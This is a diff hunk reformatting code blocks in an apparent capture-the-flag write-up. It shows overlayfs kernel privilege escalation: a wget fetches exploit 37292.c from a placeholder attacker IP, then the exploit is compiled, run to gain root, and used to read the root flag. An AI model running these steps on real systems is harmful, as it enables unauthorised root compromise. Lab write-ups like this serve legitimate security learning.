@@ -176,40 +176,40 @@ The target running Ubuntu with Kernel ```3.13.0-32``` is vulnerable to the overl
 2. Download Exploit to Target:
 Navigate to the world-writable ```/tmp``` directory on the victim host and fetch the file:
 
-    ```bash
+```bash
            cd /tmp
            wget http://<ATTACKER-IP>:8081/37292.c
-       ```
+```
 
 4. Compile Exploit:
 Replace standard compiler flags if needed and compile:
 
-    ```bash
+```bash
            sed -i "s/gcc/cc/g" 37292.c
            cc 37292.c -o exploited
-       ```
+```
 
 5. Execute Exploit:
 Run the binary to escalate privileges to root:
 
-    ```bash
+```bash
            ./exploited
-       ```
+```
 
 ### 12. Root Access & Flag Retrieval
 
 1. Verify Root Privileges:
 
-    ```bash
+```bash
                id
                Output: uid=0(root) gid=0(root) groups=0(root)
-        ```
+```
 
 3. Read Hidden Root Flag:
 
-    ```bash
+```bash
                cat /root/.flag.txt
-    ```
+```
 
 Contents of ```.flag.txt```:
 ```bash 
